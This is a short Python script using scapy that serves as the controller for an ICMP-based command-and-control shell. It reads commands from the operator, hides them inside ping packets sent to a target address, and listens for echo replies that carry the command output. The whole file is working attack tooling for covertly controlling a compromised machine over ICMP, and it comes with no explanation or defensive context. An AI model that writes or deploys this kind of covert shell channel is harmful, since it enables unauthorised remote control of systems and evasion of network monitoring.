#!/usr/bin/env python3

from scapy.all import sr,IP,ICMP,Raw,sniff
from multiprocessing import Process
import sys

ICMP_ID = int(13170)
TTL = int(64)

interface = sys.argv[1]
destination_ip = sys.argv[2]

def sniffer():
    sniff(iface=interface, prn=shell, filter="icmp", store="0")

def shell(pkt):
    if pkt[IP].src == destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
        icmppacket = pkt[Raw].load.decode('utf-8', errors='ignore').replace('\n','')
        print(icmppacket)
    else:
        pass

def main():
    sniffing = Process(target=sniffer)
    sniffing.start()
    print("[+]ICMP icmp-C2 started!")
    while True:
        icmpshell = input("shell: ")
        if icmpshell == 'exit':
            print("[+]Stopping ICMP icmp-C2...")
            sniffing.terminate()
            break
        elif icmpshell == '':
            pass
        else:
            payload = (IP(dst=destination_ip, ttl=TTL)/ICMP(type=8,id=ICMP_ID)/Raw(load=icmpshell))
            sr(payload, timeout=0, verbose=0)
    sniffing.join()

if __name__ == "__main__":
    main()
